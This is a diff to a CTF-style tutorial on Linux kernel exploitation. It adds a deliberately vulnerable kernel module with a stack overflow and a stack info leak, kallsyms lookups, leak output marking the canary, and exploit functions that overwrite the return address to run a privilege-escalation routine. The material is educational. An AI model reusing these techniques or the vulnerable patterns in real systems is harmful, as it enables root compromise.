@@ -83,6 +83,15 @@ void load_user_space(unsigned long target)
 ## Escalating Privileges in the Kernel
 ...
 
+```
+/ # cat /proc/kallsyms | grep prepare_kernel_cred
+ffffffff810881c0 T prepare_kernel_cred
+/ # cat /proc/kallsyms | grep commit_creds
+ffffffff81087e80 T commit_creds
+```
+
+...
+
 ```asm
 xor    rdi, rdi
 movabs rbx, 0xffffffff810881c0  // prepare_kernel_cred
@@ -129,16 +138,23 @@ void escalate_privileges()
 
 MODULE_LICENSE("GPL");
 
-struct proc_dir_entry *proc_entry;
+char out[256];
 
 static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
 {
-    // vulnerable read function
+    char tmp[128];
+    memcpy(out, tmp, len);
+    return copy_to_user(buf, out, len);
 }
 
 static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
 {
-    // vulnerable write function
+    char tmp[128];
+    if (copy_from_user(out, buf, len))
+        return -EINVAL;
+
+    memcpy(tmp, out, len);
+    return 0;
 }
 
 static int challenge_open(struct inode *inode, struct file *fp)
@@ -157,6 +173,8 @@ static struct file_operations fops = {
     .open    = challenge_open,
     .release = challenge_release
 };
+
+struct proc_dir_entry *proc_entry;
 
 int init_module(void)
 {
@@ -177,7 +195,9 @@ void cleanup_module(void)
 ```c
 static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
 {
-    // vulnerable read function
+    char tmp[128];
+    memcpy(out, tmp, len);
+    return copy_to_user(buf, out, len);
 }
 ```
 
@@ -186,7 +206,12 @@ static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *of
 ```c
 static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
 {
-    // vulnerable write function
+    char tmp[128];
+    if (copy_from_user(out, buf, len))
+        return -EINVAL;
+
+    memcpy(tmp, out, len);
+    return 0;
 }
 ```
 
@@ -194,9 +219,72 @@ static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, lof
 ...
 
 ```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <assert.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+int main(int argc, char **argv)
+{
+    int fd = open("/proc/challenge", O_RDWR);
+    assert(fd > 0);
+
+    unsigned long leak[32];
+    read(fd, leak, sizeof(unsigned long) * 32);
+
+    for (int i = 0; i < 32; ++i)
+        printf("0x%lx\n", leak[i]);
+
+    return 0;
+}
+```
+
+...
+
+```
+/home/ctf # ./exploit
+0xffffffff81c00194
+0xffffffff81c001a0
+0xffffffff81aa85a0
+0xffffffff81345d8b
+0x4
+0xffff888006bf5700
+0x20000075a4070
+0xffff888006bf5710
+0x100020000
+0x0
+0xffff888000000000
+0x0
+0x0
+0x0
+0x0
+0xa73ee2eeab3d9f00  <-- stack canary
+0xa73ee2eeab3d9f00
+0xffff888006bcd840  <-- return address
+0xfffffffffffffffb
+0xffffffff8123e347
+0x1
+0x0
+0xffffffff811c89f8
+0xffff888006bf5700
+0xffff888006bf5700
+0x7ffeeb3f3d10
+0x100
+0x0
+0x0
+0xffffffff811c8d1a
+0x0
+0xa73ee2eeab3d9f00
+```
+...
+
+```c
 unsigned long leak_canary(int fd)
 {
-    // ...
+    unsigned long leak[32];
+    read(fd, leak, sizeof(unsigned long) * 32);
+    return leak[15];
 }
 ```
 
@@ -205,7 +293,12 @@ unsigned long leak_canary(int fd)
 ```c
 void overflow_buffer(int fd, unsigned long canary)
 {
-    // ...
+    unsigned long payload[18];
+
+    payload[15] = canary;
+    payload[17] = (unsigned long)escalate_privileges;
+
+    write(fd, payload, sizeof(unsigned long) * 18);
 }
 ```
 
@@ -348,12 +441,19 @@ void escalate_privileges()
 
 unsigned long leak_canary(int fd)
 {
-    // ...
+    unsigned long leak[32];
+    read(fd, leak, sizeof(unsigned long) * 32);
+    return leak[15];
 }
 
 void overflow_buffer(int fd, unsigned long canary)
 {
-    // ...
+    unsigned long payload[18];
+
+    payload[15] = canary;
+    payload[17] = (unsigned long)escalate_privileges;
+
+    write(fd, payload, sizeof(unsigned long) * 18);
 }
 
 int main(int argc, char **argv)
@@ -392,3 +492,4 @@ int main(int argc, char **argv)
 
 ## Appendix
  - [Learning Linux Kernel Exploitation - Part 1](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/)
+
